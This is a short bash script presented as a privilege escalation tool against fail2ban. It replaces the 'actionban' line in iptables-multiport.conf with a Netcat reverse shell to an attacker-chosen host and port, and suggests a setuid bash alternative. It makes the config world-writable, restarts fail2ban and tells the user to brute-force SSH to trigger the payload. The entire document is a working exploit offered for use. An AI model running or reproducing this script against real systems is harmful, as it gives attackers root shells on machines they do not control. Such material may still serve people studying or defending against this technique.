#!/usr/bin/env bash
# Privilege escalation script to replace the 'actionban' line in
# fail2ban's config file with a Netcat reverse shell

if [ $# -lt 2 ]; then
    echo "[-] ERROR: No listener host IP or listener port given."
    echo "[*] You must enter command as './privesc.sh LHOST LPORT'."
    exit 1
fi

LHOST=$1
LPORT=$2
loc="/etc/fail2ban/action.d"
payload="\/usr\/bin\/nc $1 $2 -e \/bin\/bash" # this can also be "chmod +s \/bin\/bash"

mv $loc/iptables-multiport.conf $loc/iptables-multiport2.conf -f
cp $loc/iptables-multiport2.conf $loc/iptables-multiport.conf -f
chmod 777 $loc/iptables-multiport.conf -f
sed -ie "s/actionban = .*$/actionban = $payload/g" $loc/iptables-multiport.conf

sudo /etc/init.d/fail2ban restart
echo "[*] Restarted fail2ban. Quick, brute-force SSH NOW! You have 2 minutes!"
